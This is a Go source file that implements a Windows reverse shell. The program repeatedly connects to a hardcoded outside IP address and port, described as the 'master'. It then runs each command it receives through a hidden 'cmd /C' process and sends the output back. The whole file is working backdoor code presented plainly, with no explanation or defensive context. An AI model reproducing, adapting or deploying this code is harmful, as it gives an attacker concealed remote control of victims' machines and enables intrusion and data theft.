package main

import (
    "os/exec"
    "net"
    "syscall"
    "bufio"
    "time"
)

func reverseshell(addr string){

    chk_conn:
    // make sure the master is online
    for{
        c, e := net.Dial("tcp", addr)
        if e != nil {
            time.Sleep(3 * time.Second)
        } else {
            c.Close()
            break
        }
    }

    // now send out our shell
    conn,_:= net.Dial("tcp", addr)
    for{
        status, disconn := bufio.NewReader(conn).ReadString('\n');
        if disconn != nil {
            goto chk_conn
            break
        }
        cmd := exec.Command("cmd", "/C", status)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, _ := cmd.Output();
        conn.Write([]byte(out))
    }
}

func main() {
    var master_ip string
    master_ip = "132.232.23.92:1234"
    reverseshell(master_ip)
}